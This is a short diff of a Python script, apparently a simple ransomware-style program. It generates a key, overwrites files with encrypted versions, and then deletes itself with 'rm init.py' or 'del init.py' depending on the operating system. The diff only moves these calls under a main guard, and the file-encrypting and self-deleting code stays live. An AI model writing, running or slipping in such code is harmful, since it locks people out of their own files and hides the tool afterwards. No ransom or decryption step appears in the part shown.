@@ -55,11 +55,13 @@ def encriptar():
         with open(f'{i}', 'wb') as archivo_encriptado:
             archivo_encriptado.write(encriptado)
 
-if os.name == "posix":
-   borrar = "rm init.py"       
-elif os.name == "ce" or os.name == "nt" or os.name == "dos":
-   borrar = "del init.py"
+if __name__=='__main__':
+    if os.name == "posix":
+        borrar = "rm init.py"
+        
+    elif os.name == "ce" or os.name == "nt" or os.name == "dos":
+        borrar = "del init.py"
 
-generar_llave()
-encriptar()
-os.system(borrar)
+    generar_llave()
+    encriptar()
+    os.system(borrar)
